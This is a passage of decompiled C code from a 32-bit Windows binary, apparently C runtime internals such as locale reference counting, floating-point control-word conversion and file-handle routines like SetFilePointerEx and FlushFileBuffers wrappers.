    int32_t v6 = *(int32_t *)(a1 + 128); // 0x40de1d
    if (v6 != 0) {
        int32_t * v7 = (int32_t *)v6; // 0x40de27
        *v7 = *v7 + 1;
    }
    int32_t v8 = *(int32_t *)(a1 + 140); // 0x40de2a
    if (v8 != 0) {
        int32_t * v9 = (int32_t *)v8; // 0x40de34
        *v9 = *v9 + 1;
    }
    int32_t v10 = 6; // 0x40de3d
    int32_t v11 = a1 + 40;
    int32_t v12; // 0x40de47
    int32_t * v13; // 0x40de4d
    if (*(int32_t *)(v11 - 8) != (int32_t)&g124) {
        // 0x40de47
        v12 = *(int32_t *)v11;
        if (v12 != 0) {
            // 0x40de4d
            v13 = (int32_t *)v12;
            *v13 = *v13 + 1;
        }
    }
    // 0x40de50
    int32_t v14; // 0x40de56
    int32_t * v15; // 0x40de5d
    if (*(int32_t *)(v11 - 12) != 0) {
        // 0x40de56
        v14 = *(int32_t *)(v11 - 4);
        if (v14 != 0) {
            // 0x40de5d
            v15 = (int32_t *)v14;
            *v15 = *v15 + 1;
        }
    }
    // 0x40de60
    v10--;
    int32_t v16 = v11 + 16; // 0x40de66
    while (v10 != 0) {
        // 0x40de3e
        v11 = v16;
        if (*(int32_t *)(v11 - 8) != (int32_t)&g124) {
            // 0x40de47
            v12 = *(int32_t *)v11;
            if (v12 != 0) {
                // 0x40de4d
                v13 = (int32_t *)v12;
                *v13 = *v13 + 1;
            }
        }
        // 0x40de50
        if (*(int32_t *)(v11 - 12) != 0) {
            // 0x40de56
            v14 = *(int32_t *)(v11 - 4);
            if (v14 != 0) {
                // 0x40de5d
                v15 = (int32_t *)v14;
                *v15 = *v15 + 1;
            }
        }
        // 0x40de60
        v10--;
        v16 = v11 + 16;
    }
    // 0x40de68
    return function_40dfc1(*(int32_t *)(a1 + 156));
}

// Address range: 0x40de77 - 0x40dfc1
int32_t function_40de77(int32_t a1) {
    int32_t * v1 = (int32_t *)(a1 + 136); // 0x40de83
    int32_t v2 = *v1; // 0x40de83
    if (v2 != 0 && v2 != (int32_t)&g134) {
        int32_t * v3 = (int32_t *)(a1 + 124); // 0x40de94
        int32_t v4 = *v3; // 0x40de94
        if (v4 != 0) {
            // 0x40de9b
            if (*(int32_t *)v4 == 0) {
                int32_t v5 = *(int32_t *)(a1 + 132); // 0x40dea0
                if (v5 != 0) {
                    // 0x40deaa
                    if (*(int32_t *)v5 == 0) {
                        // 0x40deaf
                        function_40bbdc(v5);
                        function_40da36(*v1);
                    }
                }
                int32_t v6 = *(int32_t *)(a1 + 128); // 0x40dec2
                if (v6 != 0) {
                    // 0x40decc
                    if (*(int32_t *)v6 == 0) {
                        // 0x40ded1
                        function_40bbdc(v6);
                        function_40db34(*v1);
                    }
                }
                // 0x40dee4
                function_40bbdc(*v3);
                function_40bbdc(*v1);
            }
        }
    }
    int32_t * v7 = (int32_t *)(a1 + 140); // 0x40def9
    int32_t v8 = *v7; // 0x40def9
    if (v8 != 0) {
        // 0x40df03
        if (*(int32_t *)v8 == 0) {
            // 0x40df08
            function_40bbdc(*(int32_t *)(a1 + 144) - 254);
            function_40bbdc(*(int32_t *)(a1 + 148) - 128);
            function_40bbdc(*(int32_t *)(a1 + 152) - 128);
            function_40bbdc(*v7);
        }
    }
    // 0x40df48
    function_40dfea(*(int32_t *)(a1 + 156));
    int32_t v9; // bp-20, 0x40de77
    int32_t v10 = &v9; // 0x40df56
    int32_t * v11 = (int32_t *)(v10 - 4);
    int32_t v12 = a1 + 40;
    int32_t v13 = a1 + 160;
    int32_t v14 = 6;
    int32_t v15; // 0x40df6c
    if (*(int32_t *)(v12 - 8) != (int32_t)&g124) {
        // 0x40df6c
        v15 = *(int32_t *)v12;
        if (v15 != 0) {
            // 0x40df72
            if (*(int32_t *)v15 == 0) {
                // 0x40df77
                *v11 = v15;
                function_40bbdc(v14);
                *(int32_t *)(v10 - 8) = *(int32_t *)v13;
                function_40bbdc((int32_t)&g266);
            }
        }
    }
    // 0x40df89
    int32_t v16; // 0x40df8f
    if (*(int32_t *)(v12 - 12) != 0) {
        // 0x40df8f
        v16 = *(int32_t *)(v12 - 4);
        if (v16 != 0) {
            // 0x40df96
            if (*(int32_t *)v16 == 0) {
                // 0x40df9b
                *v11 = v16;
                function_40bbdc((int32_t)&g266);
            }
        }
    }
    int32_t v17 = v14 - 1; // 0x40dfab
    int32_t v18 = v13 + 4; // 0x40dfb1
    int32_t v19 = v12 + 16; // 0x40dfb1
    while (v17 != 0) {
        // 0x40df63
        v12 = v19;
        v13 = v18;
        v14 = v17;
        if (*(int32_t *)(v12 - 8) != (int32_t)&g124) {
            // 0x40df6c
            v15 = *(int32_t *)v12;
            if (v15 != 0) {
                // 0x40df72
                if (*(int32_t *)v15 == 0) {
                    // 0x40df77
                    *v11 = v15;
                    function_40bbdc(v14);
                    *(int32_t *)(v10 - 8) = *(int32_t *)v13;
                    function_40bbdc((int32_t)&g266);
                }
            }
        }
        // 0x40df89
        if (*(int32_t *)(v12 - 12) != 0) {
            // 0x40df8f
            v16 = *(int32_t *)(v12 - 4);
            if (v16 != 0) {
                // 0x40df96
                if (*(int32_t *)v16 == 0) {
                    // 0x40df9b
                    *v11 = v16;
                    function_40bbdc((int32_t)&g266);
                }
            }
        }
        // 0x40dfa5
        v17 = v14 - 1;
        v18 = v13 + 4;
        v19 = v12 + 16;
    }
    // 0x40dfb3
    *v11 = a1;
    return function_40bbdc(0);
}

// Address range: 0x40dfc1 - 0x40dfea
int32_t function_40dfc1(int32_t a1) {
    if (a1 == 0 || a1 == (int32_t)&g36) {
        // 0x40dfe3
        return 0x7fffffff;
    }
    int32_t * v1 = (int32_t *)(a1 + 176); // 0x40dfd8
    int32_t result = *v1 + 1; // 0x40dfd8
    *v1 = result;
    return result;
}

// Address range: 0x40dfea - 0x40e01a
int32_t function_40dfea(int32_t a1) {
    // 0x40dfea
    int32_t result; // 0x40dfea
    if (a1 == 0 || a1 == (int32_t)&g36) {
        // 0x40e017
        return result;
    }
    int32_t v1 = *(int32_t *)(a1 + 176); // 0x40dfff
    result = v1;
    if (v1 == 0) {
        // 0x40e009
        int32_t v2; // 0x40dfea
        int32_t v3; // 0x40dfea
        function_40dbd9(a1, v2, v3);
        result = function_40bbdc(a1);
    }
    // 0x40e017
    return result;
}

// Address range: 0x40e01a - 0x40e043
int32_t function_40e01a(int32_t a1) {
    if (a1 == 0 || a1 == (int32_t)&g36) {
        // 0x40e03c
        return 0x7fffffff;
    }
    int32_t * v1 = (int32_t *)(a1 + 176); // 0x40e031
    int32_t result = *v1 - 1; // 0x40e031
    *v1 = result;
    return result;
}

// Address range: 0x40e043 - 0x40e0c4
int32_t function_40e043(int32_t a1) {
    // 0x40e043
    if (a1 == 0) {
        // 0x40e0c2
        return 0;
    }
    int32_t * v1 = (int32_t *)(a1 + 12); // 0x40e04f
    *v1 = *v1 - 1;
    int32_t v2 = *(int32_t *)(a1 + 124); // 0x40e053
    if (v2 != 0) {
        int32_t * v3 = (int32_t *)v2; // 0x40e05a
        *v3 = *v3 - 1;
    }
    int32_t v4 = *(int32_t *)(a1 + 132); // 0x40e05d
    if (v4 != 0) {
        int32_t * v5 = (int32_t *)v4; // 0x40e067
        *v5 = *v5 - 1;
    }
    int32_t v6 = *(int32_t *)(a1 + 128); // 0x40e06a
    if (v6 != 0) {
        int32_t * v7 = (int32_t *)v6; // 0x40e074
        *v7 = *v7 - 1;
    }
    int32_t v8 = *(int32_t *)(a1 + 140); // 0x40e077
    if (v8 != 0) {
        int32_t * v9 = (int32_t *)v8; // 0x40e081
        *v9 = *v9 - 1;
    }
    int32_t v10 = 6; // 0x40e08a
    int32_t v11 = a1 + 40;
    int32_t v12; // 0x40e094
    int32_t * v13; // 0x40e09a
    if (*(int32_t *)(v11 - 8) != (int32_t)&g124) {
        // 0x40e094
        v12 = *(int32_t *)v11;
        if (v12 != 0) {
            // 0x40e09a
            v13 = (int32_t *)v12;
            *v13 = *v13 - 1;
        }
    }
    // 0x40e09d
    int32_t v14; // 0x40e0a3
    int32_t * v15; // 0x40e0aa
    if (*(int32_t *)(v11 - 12) != 0) {
        // 0x40e0a3
        v14 = *(int32_t *)(v11 - 4);
        if (v14 != 0) {
            // 0x40e0aa
            v15 = (int32_t *)v14;
            *v15 = *v15 - 1;
        }
    }
    // 0x40e0ad
    v10--;
    int32_t v16 = v11 + 16; // 0x40e0b3
    while (v10 != 0) {
        // 0x40e08b
        v11 = v16;
        if (*(int32_t *)(v11 - 8) != (int32_t)&g124) {
            // 0x40e094
            v12 = *(int32_t *)v11;
            if (v12 != 0) {
                // 0x40e09a
                v13 = (int32_t *)v12;
                *v13 = *v13 - 1;
            }
        }
        // 0x40e09d
        if (*(int32_t *)(v11 - 12) != 0) {
            // 0x40e0a3
            v14 = *(int32_t *)(v11 - 4);
            if (v14 != 0) {
                // 0x40e0aa
                v15 = (int32_t *)v14;
                *v15 = *v15 - 1;
            }
        }
        // 0x40e0ad
        v10--;
        v16 = v11 + 16;
    }
    // 0x40e0c2
    return function_40e01a(*(int32_t *)(a1 + 156));
}

// Address range: 0x40e0c4 - 0x40e13b
int32_t function_40e0c4(int32_t a1, int32_t a2) {
    // 0x40e0c4
    function_406770(&g105, 12, (int32_t)&g266);
    int32_t v1; // 0x40e0c4
    int32_t * v2 = (int32_t *)(v1 - 28); // 0x40e0d0
    *v2 = 0;
    int32_t v3 = function_40ba33(); // 0x40e0d4
    int32_t * v4 = (int32_t *)(v3 + 76);
    int32_t result; // 0x40e135
    if ((*(int32_t *)(v3 + 848) & (int32_t)g139) != 0) {
        // 0x40e0e9
        if (*v4 != 0) {
            // 0x40e133
            result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
            return result;
        }
    }
    // 0x40e0f0
    function_40bfa7(4);
    int32_t * v5 = (int32_t *)(v1 - 4); // 0x40e0f8
    *v5 = 0;
    int32_t v6 = function_40e13b(v4, g206); // 0x40e106
    *v2 = v6;
    *v5 = -2;
    function_40e12a();
    if (v6 == 0) {
        // 0x40e122
        function_40a98b();
        // UNREACHABLE
    }
    // 0x40e133
    result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    return result;
}

// Address range: 0x40e12a - 0x40e133
int32_t function_40e12a(void) {
    // 0x40e12a
    return function_40bfef(4);
}

// Address range: 0x40e13b - 0x40e18b
int32_t function_40e13b(int32_t * a1, int32_t result) {
    // 0x40e13b
    if (a1 == NULL || result == 0) {
        // 0x40e187
        return 0;
    }
    int32_t v1 = *a1; // 0x40e150
    if (v1 == result) {
        // 0x40e187
        return result;
    }
    // 0x40e15a
    *a1 = result;
    function_40ddfa(result);
    if (v1 == 0) {
        // 0x40e187
        return result;
    }
    // 0x40e167
    function_40e043(v1);
    if (v1 != (int32_t)&g122 && *(int32_t *)(v1 + 12) == 0) {
        // 0x40e17c
        function_40de77(v1);
    }
    // 0x40e187
    return result;
}

// Address range: 0x40e18b - 0x40e236
int32_t function_40e18b(uint32_t a1) {
    int32_t v1 = 64 * a1 & 512 | 8 * a1 & 128 | 256 * a1 & 1024 | 1024 * a1 & 2048 | 0x1000 * a1 & 0x1000 | a1 / 2048 & 256;
    int32_t v2 = a1 & 768; // 0x40e1e2
    int32_t result = v1; // 0x40e18b
    int32_t v3; // 0x40e20b
    switch (v2) {
        case 256: {
            // 0x40e200
            result = v1 | 0x2000;
        }
        case 0: {
          lab_0x40e205:
            // 0x40e205
            v3 = a1 & 0x3000000;
            switch (v3) {
                case 0x1000000: {
                    // 0x40e234
                    return result | 0x8040;
                }
                case 0x2000000: {
                    // 0x40e22a
                    return result | 64;
                }
            }
            // break -> 0x40e21f
            break;
        }
        case 512: {
            // 0x40e1f9
            result = v1 | 0x4000;
            // branch (via goto) -> 0x40e205
            goto lab_0x40e205;
        }
        default: {
            // 0x40e1ee
            result = v2 != 768 ? v1 : v1 | 0x6000;
            // branch (via goto) -> 0x40e205
            goto lab_0x40e205;
        }
    }
    // 0x40e21f
    if (v3 == 0x3000000) {
        // 0x40e223
        return result | 0x8000;
    }
    // 0x40e234
    return result;
}

// Address range: 0x40e236 - 0x40e538
int32_t function_40e236(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    // 0x40e236
    __asm_wait();
    uint16_t v1; // 0x40e236
    uint32_t v2 = (int32_t)v1; // 0x40e242
    int32_t v3 = 2 * v2 & 8 | (int32_t)(16 * v1 & 16) | v2 / 2 & 4 | v2 / 8 & 2 | v2 / 32 & 1 | 0x40000 * v2 & 0x80000;
    int32_t v4 = v2 & 3072; // 0x40e287
    int32_t v5 = v3; // 0x40e236
    int32_t v6; // 0x40e236
    switch (v4) {
        case 1024: {
            // 0x40e2ab
            v5 = v3 | 256;
        }
        case 0: {
          lab_0x40e2b1:;
            int32_t v7 = v5;
            int32_t v8 = v2 & 768; // 0x40e2b1
            if (v8 == 0) {
                // 0x40e2c5
                v6 = v7 | 0x20000;
            } else {
                // 0x40e2b9
                v6 = v8 != 512 ? v7 : v7 | 0x10000;
            }
            // break -> 0x40e2cb
            break;
        }
        case 2048: {
            // 0x40e2a7
            v5 = v3 | 512;
            // branch (via goto) -> 0x40e2b1
            goto lab_0x40e2b1;
        }
        default: {
            // 0x40e29b
            v5 = v4 != 3072 ? v3 : v3 | 768;
            // branch (via goto) -> 0x40e2b1
            goto lab_0x40e2b1;
        }
    }
    int32_t v9 = v6 | 64 * v2 & 0x40000;
    int32_t v10 = v9 & (a2 ^ -1) | a2 & a1; // 0x40e2e9
    int32_t result = v9; // 0x40e2ed
    if (v10 != v9) {
        // 0x40e2f3
        int32_t v11; // 0x40e236
        int32_t v12; // 0x40e236
        int32_t v13; // 0x40e236
        uint32_t v14 = function_40e538(v10, v11, v12, v13); // 0x40e2f4
        __asm_wait();
        int32_t v15 = 2 * v14 & 8 | 16 * v14 & 16 | v14 / 2 & 4 | v14 / 8 & 2 | v14 / 32 & 1 | 0x40000 * v14 & 0x80000;
        int32_t v16 = v14 & 3072; // 0x40e33d
        int32_t v17 = v15; // 0x40e236
        int32_t v18; // 0x40e236
        switch (v16) {
            case 1024: {
                // 0x40e365
                v17 = v15 | 256;
            }
            case 0: {
              lab_0x40e36b:;
                int32_t v19 = v17;
                int32_t v20 = v14 & 768; // 0x40e36b
                if (v20 == 0) {
                    // 0x40e383
                    v18 = v19 | 0x20000;
                } else {
                    // 0x40e373
                    v18 = v20 != 512 ? v19 : v19 | 0x10000;
                }
                // break -> 0x40e389
                break;
            }
            case 2048: {
                // 0x40e35d
                v17 = v15 | 512;
                // branch (via goto) -> 0x40e36b
                goto lab_0x40e36b;
            }
            default: {
                // 0x40e351
                v17 = v16 != 3072 ? v15 : v15 | 768;
                // branch (via goto) -> 0x40e36b
                goto lab_0x40e36b;
            }
        }
        // 0x40e389
        result = v18 | 64 * v14 & 0x40000;
    }
    // 0x40e399
    if (g162 < 1) {
        // 0x40e531
        return result;
    }
    // 0x40e3a6
    char v21; // 0x40e236
    uint32_t v22 = (int32_t)v21; // 0x40e3ac
    __asm_stmxcsr(v22);
    int32_t v23 = v21 >= 0 ? 0 : 16;
    int32_t v24 = v22 / 64 & 8 | v23 | v22 / 256 & 4 | v22 / 1024 & 2 | v22 / 0x1000 & 1 | 2048 * v22 & 0x80000;
    int32_t v25 = v22 & 0x6000; // 0x40e3f5
    int32_t v26 = v24; // 0x40e236
    int32_t v27; // 0x40e236
    int32_t v28; // 0x40e281
    int32_t * v29; // 0x40e423
    switch (v25) {
        case 0x2000: {
            // 0x40e41d
            v26 = v24 | 256;
        }
        case 0: {
          lab_0x40e423:;
            // 0x40e423
            int32_t v30; // bp-32, 0x40e236
            v28 = &v30;
            int32_t v31 = v26;
            v29 = (int32_t *)(v28 - 4);
            *v29 = 64;
            int32_t v32 = v22 & 0x8040; // 0x40e425
            if (v32 == 64) {
                // 0x40e44a
                v27 = v31 | 0x2000000;
            } else {
                int32_t v33 = v32 - 0x8000; // 0x40e42f
                if (v33 == 0) {
                    // 0x40e442
                    v27 = v31 | 0x3000000;
                } else {
                    // 0x40e436
                    v27 = v33 != 64 ? v31 : v31 | 0x1000000;
                }
            }
            // break -> 0x40e450
            break;
        }
        case 0x4000: {
            // 0x40e415
            v26 = v24 | 512;
            // branch (via goto) -> 0x40e423
            goto lab_0x40e423;
        }
        default: {
            // 0x40e409
            v26 = v25 != 0x6000 ? v24 : v24 | 768;
            // branch (via goto) -> 0x40e423
            goto lab_0x40e423;
        }
    }
    int32_t v34 = a2 & 0x308031f; // 0x40e3a6
    int32_t v35 = v27 & (v34 ^ -1) | v34 & a1; // 0x40e459
    int32_t v36 = v27; // 0x40e45d
    if (v35 != v27) {
        // 0x40e463
        *v29 = v35;
        uint32_t v37 = function_40e18b((int32_t)&g266); // 0x40e464
        *(int32_t *)(v28 - 8) = v37;
        function_40f36f(v37);
        __asm_stmxcsr(v37);
        int32_t v38 = 0; // 0x40e47f
        if ((char)v37 < 0) {
            // 0x40e481
            *v29 = 16;
            v38 = 16;
        }
        int32_t v39 = v37 / 256 & 4 | v37 / 64 & 8 | v37 / 1024 & 2 | v37 / 0x1000 & 1 | 2048 * v37 & 0x80000 | v38;
        int32_t v40 = v37 & 0x6000; // 0x40e4c0
        int32_t v41 = v39; // 0x40e236
        switch (v40) {
            case 0x2000: {
                // 0x40e4e8
                v41 = v39 | 256;
            }
            case 0: {
              lab_0x40e4ee:;
                int32_t v42 = v41;
                int32_t v43 = v37 & 0x8040; // 0x40e4ee
                if (v43 == 64) {
                    // 0x40e512
                    v36 = v42 | 0x2000000;
                } else {
                    int32_t v44 = v43 - 0x8000; // 0x40e4f7
                    if (v44 == 0) {
                        // 0x40e50a
                        v36 = v42 | 0x3000000;
                    } else {
                        // 0x40e4fe
                        v36 = v44 != 64 ? v42 : v42 | 0x1000000;
                    }
                }
                // break -> 0x40e518
                break;
            }
            case 0x4000: {
                // 0x40e4e0
                v41 = v39 | 512;
                // branch (via goto) -> 0x40e4ee
                goto lab_0x40e4ee;
            }
            default: {
                // 0x40e4d4
                v41 = v40 != 0x6000 ? v39 : v39 | 768;
                // branch (via goto) -> 0x40e4ee
                goto lab_0x40e4ee;
            }
        }
    }
    int32_t v45 = v36 | result; // 0x40e51a
    // 0x40e531
    return ((v36 ^ result) & 0x8031f) == 0 ? v45 : v45 | -0x80000000;
}

// Address range: 0x40e538 - 0x40e5d1
int32_t function_40e538(uint32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = 2 * a1 & 8 | a1 / 2 & 4 | 8 * a1 & 16 | 32 * a1 & 32 | a1 / 0x40000 & 2 | (int32_t)(bool)((a1 & 16) != 0);
    int32_t v2 = a1 & 768; // 0x40e581
    int32_t v3 = v1; // 0x40e538
    int32_t v4; // 0x40e538
    switch (v2) {
        case 256: {
            // 0x40e5a3
            v3 = v1 | 1024;
        }
        case 0: {
          lab_0x40e5a8:;
            int32_t v5 = v3;
            int32_t v6 = a1 & 0x30000; // 0x40e5aa
            if (v6 == 0) {
                // 0x40e5be
                v4 = v5 | 768;
            } else {
                // 0x40e5b2
                v4 = v6 != 0x10000 ? v5 : v5 | 512;
            }
            // break -> 0x40e5c0
            break;
        }
        case 512: {
            // 0x40e59c
            v3 = v1 | 2048;
            // branch (via goto) -> 0x40e5a8
            goto lab_0x40e5a8;
        }
        default: {
            // 0x40e591
            v3 = v2 != 768 ? v1 : v1 | 3072;
            // branch (via goto) -> 0x40e5a8
            goto lab_0x40e5a8;
        }
    }
    // 0x40e5c0
    return v4 | a1 / 64 & 0x1000;
}

// Address range: 0x40e5d1 - 0x40e627
int32_t function_40e5d1(uint32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    if (a1 == -2) {
        // 0x40e5de
        *(int32_t *)function_40ab11() = 9;
        // 0x40e623
        return 0;
    }
    if (a1 >= 0) {
        // 0x40e5ef
        if ((uint32_t)g209 > a1) {
            int32_t v1 = *(int32_t *)(4 * a1 / 64 + (int32_t)&g207); // 0x40e602
            return (int32_t)(*(char *)(48 * (a1 & 63) + 40 + v1) & 64);
        }
    }
    // 0x40e613
    *(int32_t *)function_40ab11() = 9;
    // 0x40e623
    return 0;
}

// Address range: 0x40e627 - 0x40e6a5
int32_t function_40e627(int32_t a1, int32_t a2, int32_t lpNewFilePointer, int32_t a4, int32_t a5) {
    struct _LARGE_INTEGER liDistanceToMove; // 0x40e660
    int32_t hFile = function_40d9cc(a1); // 0x40e634
    if (hFile == -1) {
        // 0x40e641
        *(int32_t *)function_40ab11() = 9;
        // 0x40e69f
        return -1;
    }
    // 0x40e652
    liDistanceToMove = (struct {int64_t e0;}){
        .e0 = 0
    };
    liDistanceToMove.e0 = a2;
    int32_t dwMoveMethod; // bp-12, 0x40e627
    bool v1 = SetFilePointerEx((int32_t *)hFile, liDistanceToMove, (struct _LARGE_INTEGER *)lpNewFilePointer, (int32_t)&dwMoveMethod); // 0x40e660
    if (!v1) {
        // 0x40e66a
        GetLastError();
        function_40aadb();
        // 0x40e69f
        return -1;
    }
    int32_t result = -1; // 0x40e683
    int32_t v2; // 0x40e627
    if ((result & v2) != -1) {
        int32_t v3 = *(int32_t *)(4 * a1 / 64 + (int32_t)&g207); // 0x40e693
        char * v4 = (char *)(48 * (a1 & 63) + 40 + v3); // 0x40e69a
        *v4 = *v4 & -3;
    }
    // 0x40e69f
    return result;
}

// Address range: 0x40e6a5 - 0x40e6c0
int32_t function_40e6a5(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9) {
    // 0x40e6a5
    int32_t v1; // 0x40e6a5
    return function_40e627(a1, a2, a3, a4, v1);
}

// Address range: 0x40e6c0 - 0x40e705
int32_t function_40e6c0(int32_t a1) {
    int32_t lpBuffer = a1;
    int32_t hConsoleOutput = g141; // 0x40e6ce
    if (g141 == -2) {
        // 0x40e6d0
        int32_t v1; // 0x40e6c0
        int32_t v2; // 0x40e6c0
        function_40f491(v2, v1);
        hConsoleOutput = g141;
    }
    // 0x40e6da
    if (hConsoleOutput == -1) {
        // 0x40e701
        return 0xffff;
    }
    // 0x40e6e6
    int32_t lpNumberOfCharsWritten; // bp-8, 0x40e6c0
    bool v3 = WriteConsoleW((int32_t *)hConsoleOutput, &lpBuffer, 1, &lpNumberOfCharsWritten, NULL); // 0x40e6f3
    int32_t result = 0xffff; // 0x40e6fb
    if (v3) {
        // 0x40e6fd
        result = lpBuffer | -0x10000;
    }
    // 0x40e701
    return result;
}

// Address range: 0x40e705 - 0x40e79c
int32_t function_40e705(void) {
    int32_t v1 = &g106; // bp-8, 0x40e707
    function_406770(&g106, 16, (int32_t)&g266);
    int32_t v2; // 0x40e705
    int32_t * v3 = (int32_t *)(v2 - 28); // 0x40e711
    *v3 = 0;
    function_40bfa7(8);
    int32_t * v4 = (int32_t *)(v2 - 4); // 0x40e71d
    *v4 = 0;
    int32_t * v5 = (int32_t *)(v2 - 32); // 0x40e724
    *v5 = 3;
    int32_t result; // 0x40e796
    if (g202 == 3) {
        // 0x40e787
        *v4 = -2;
        function_40e79c();
        result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
        return result;
    }
    int32_t v6 = 3; // 0x40e784
    int32_t v7 = &v1;
    int32_t v8 = 4 * v6; // 0x40e734
    int32_t v9 = *(int32_t *)(g203 + v8); // 0x40e734
    int32_t v10 = v7; // 0x40e739
    int32_t * v11; // 0x40e705
    if (v9 != 0) {
        // 0x40e73b
        v10 = v7 - 4;
        v11 = (int32_t *)v10;
        if ((*(int32_t *)(v9 + 12) & 0x2000) != 0) {
            // 0x40e745
            *v11 = v9;
            if (function_40f53d() != -1) {
                // 0x40e758
                *v3 = *v3 + 1;
            }
        }
        // 0x40e75b
        *v11 = *(int32_t *)(g203 + v8) + 32;
        DeleteCriticalSection((struct _RTL_CRITICAL_SECTION *)&g266);
        *(int32_t *)(v7 - 8) = *(int32_t *)(g203 + v8);
        function_40bbdc((int32_t)&g266);
        *(int32_t *)(g203 + v8) = 0;
    }
    // 0x40e784
    v6++;
    *v5 = v6;
    while (v6 != g202) {
        // 0x40e72f
        v7 = v10;
        v8 = 4 * v6;
        v9 = *(int32_t *)(g203 + v8);
        v10 = v7;
        if (v9 != 0) {
            // 0x40e73b
            v10 = v7 - 4;
            v11 = (int32_t *)v10;
            if ((*(int32_t *)(v9 + 12) & 0x2000) != 0) {
                // 0x40e745
                *v11 = v9;
                if (function_40f53d() != -1) {
                    // 0x40e758
                    *v3 = *v3 + 1;
                }
            }
            // 0x40e75b
            *v11 = *(int32_t *)(g203 + v8) + 32;
            DeleteCriticalSection((struct _RTL_CRITICAL_SECTION *)&g266);
            *(int32_t *)(v7 - 8) = *(int32_t *)(g203 + v8);
            function_40bbdc((int32_t)&g266);
            *(int32_t *)(g203 + v8) = 0;
        }
        // 0x40e784
        v6++;
        *v5 = v6;
    }
    // 0x40e787
    *v4 = -2;
    function_40e79c();
    result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266);
    return result;
}

// Address range: 0x40e79c - 0x40e7a5
int32_t function_40e79c(void) {
    // 0x40e79c
    return function_40bfef(8);
}

// Address range: 0x40e7a5 - 0x40e7e3
int32_t function_40e7a5(int32_t a1) {
    int32_t * v1 = (int32_t *)(a1 + 12); // 0x40e7b2
    uint32_t v2 = *v1; // 0x40e7b2
    if ((v2 & 0x2000) == 0) {
        // 0x40e7df
        return v2 / 0x2000;
    }
    int32_t result = v2 / 64; // 0x40e7c2
    if ((v2 & 64) != 0) {
        int32_t * v3 = (int32_t *)(a1 + 4); // 0x40e7c4
        function_40bbdc(*v3);
        *v1 = *v1 & -321;
        *v3 = 0;
        *(int32_t *)a1 = 0;
        *(int32_t *)(a1 + 8) = 0;
        result = 0;
    }
    // 0x40e7df
    return result;
}

// Address range: 0x40e7e3 - 0x40e86c
int32_t function_40e7e3(int32_t * a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, int32_t a6) {
    // 0x40e7e3
    function_406770(&g107, 12, (int32_t)&g266);
    int32_t v1; // 0x40e7e3
    int32_t * v2 = (int32_t *)(v1 - 28); // 0x40e7f1
    *v2 = 0;
    function_40d8f5(*(int32_t *)*(int32_t *)(v1 + 8));
    int32_t * v3 = (int32_t *)(v1 - 4); // 0x40e7ff
    *v3 = 0;
    int32_t v4 = *(int32_t *)*(int32_t *)*(int32_t *)(v1 + 12); // 0x40e807
    int32_t v5 = *(int32_t *)(4 * v4 / 64 + (int32_t)&g207); // 0x40e816
    int32_t v6; // 0x40e7e3
    if ((*(char *)(v5 + 40 + 48 * (v4 & 63)) & 1) == 0) {
        goto lab_0x40e845;
    } else {
        int32_t hFile = function_40d9cc(v4); // 0x40e825
        v6 = 0;
        if (FlushFileBuffers((int32_t *)hFile)) {
            goto lab_0x40e853;
        } else {
            // 0x40e836
            *(int32_t *)function_40aafe() = GetLastError();
            goto lab_0x40e845;
        }
    }
  lab_0x40e845:
    // 0x40e845
    *(int32_t *)function_40ab11() = 9;
    v6 = -1;
    goto lab_0x40e853;
  lab_0x40e853:
    // 0x40e853
    *v2 = v6;
    *v3 = -2;
    function_40e86f();
    int32_t result = function_4067b6((int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266, (int32_t)&g266); // 0x40e864
    return result;
}

// Address range: 0x40e86f - 0x40e87b
int32_t function_40e86f(void) {
    // 0x40e86f
    int32_t v1; // 0x40e86f
    return function_40d918(*(int32_t *)*(int32_t *)(v1 + 16));
}

// Address range: 0x40e87b - 0x40e8a3
int32_t function_40e87b(int32_t a1, int32_t * a2, int32_t a3, int32_t * a4, int32_t a5) {
    int32_t v1 = a1; // bp-12, 0x40e889
    int32_t v2 = a1; // bp-16, 0x40e88c
    int32_t v3; // 0x40e87b
    return function_40e7e3(&v2, (int32_t)a2, &v1, a1, a1, v3);
}

// Address range: 0x40e8a3 - 0x40e912
int32_t function_40e8a3(uint32_t a1) {
    int32_t v1 = a1;
    if (a1 == -2) {
        // 0x40e8b2
        *(int32_t *)function_40ab11() = 9;
        // 0x40e90d
        return -1;
    }
    if (a1 < 0 || g209 <= a1) {
        // 0x40e8fa
        *(int32_t *)function_40ab11() = 9;
        // 0x40e90d
        return -1;
    }
    int32_t v2 = *(int32_t *)(4 * a1 / 64 + (int32_t)&g207); // 0x40e8d8
    if ((*(char *)(48 * (a1 & 63) + 40 + v2) & 1) == 0) {
        // 0x40e8fa
        *(int32_t *)function_40ab11() = 9;
        // 0x40e90d
        return -1;
    }
    int32_t v3 = &v1; // bp-8, 0x40e8e9
    // 0x40e90d
    int32_t v4; // 0x40e8a3
    int32_t v5; // 0x40e8a3
    return function_40e87b(a1, &v3, v4, &v1, v5);
}

// Address range: 0x40e912 - 0x40e94b
int32_t function_40e912(int32_t a1, int32_t * a2) {
    // 0x40e912
    function_4093d4((int32_t)a2, (int32_t)&g266);
    char v1; // 0x40e912
    if (v1 != 0) {
        // 0x40e93d
        int32_t v2; // 0x40e912
        int32_t * v3 = (int32_t *)(v2 + 848); // 0x40e940
        *v3 = *v3 & -3;
    }
    // 0x40e947
    int32_t v4; // 0x40e912
    return (int32_t)(*(int16_t *)(*(int32_t *)v4 + (2 * a1 & 510)) & -0x8000);
}

// Address range: 0x40e94b - 0x40eb68
int32_t function_40e94b(int32_t * a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9) {
    int32_t cbMultiByte = a5; // 0x40e964
    if (a5 >= 1) {
        // 0x40e966
        int32_t v1; // bp-4, 0x40e94b
        int32_t v2; // 0x40e94b
